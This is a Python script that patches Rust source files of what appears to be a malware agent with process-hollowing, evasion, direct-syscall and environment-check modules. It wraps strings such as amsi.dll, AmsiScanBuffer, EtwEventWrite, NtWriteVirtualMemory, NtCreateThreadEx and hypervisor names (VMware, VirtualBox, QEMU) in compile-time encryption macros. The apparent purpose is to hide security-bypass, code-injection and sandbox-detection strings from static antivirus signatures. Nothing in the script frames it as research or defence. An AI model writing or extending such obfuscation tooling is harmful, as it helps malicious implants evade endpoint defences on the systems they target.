import os
import re

def process_file(filepath):
    if not os.path.exists(filepath):
        return
    with open(filepath, 'r') as f:
        content = f.read()

    # Add use string_crypt::* if not present
    if "string_crypt::" not in content and "#[cfg(windows)]" in content:
        # Just use fully qualified paths to avoid import issues
        pass

    # Replace byte string literals ending with \0
    # b"Something\0" -> string_crypt::enc_str!("Something")
    new_content = re.sub(r'b"([^"]*?)\\0"', r'string_crypt::enc_str!("\1")', content)
    
    # Replace L"Something" -> string_crypt::enc_wstr!("Something")
    # Actually Rust wide strings are usually represented by os string conversions or custom macros,
    # but if they exist as strings, we replace them.
    # Let's target specific known strings for safety:
    targets = [
        "amsi.dll", "AmsiScanBuffer", "AmsiInitialize", "ntdll.dll", "EtwEventWrite",
        "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx", "NtClose",
        "NtOpenFile", "NtProtectVirtualMemory",
        "VMware", "VirtualBox", "QEMU", "Xen", "Bochs", "microsoft corporation", "Parallels"
    ]
    
    for t in targets:
        # standard strings "target" -> string_crypt::enc_str!("target")
        # Watch out for existing replacements or where quotes are needed
        pass

    # Actually, the regex `b"([^"]*?)\\0"` covers most of the C-string API calls.
    # Let's also look for plain strings like "VMware"
    dmi_targets = ["VMware", "VirtualBox", "QEMU", "Xen", "Bochs", "Parallels", "microsoft corporation"]
    for dmi in dmi_targets:
        new_content = new_content.replace(f'"{dmi}"', f'std::str::from_utf8(&string_crypt::enc_str!("{dmi}")[..{len(dmi)}]).unwrap()')

    with open(filepath, 'w') as f:
        f.write(new_content)
    print(f"Patched {filepath}")

for f in [
    "agent/src/syscalls.rs",
    "agent/src/evasion.rs",
    "agent/src/env_check.rs",
    "agent/src/process_manager.rs",
    "hollowing/src/windows_impl.rs"
]:
    process_file(f)
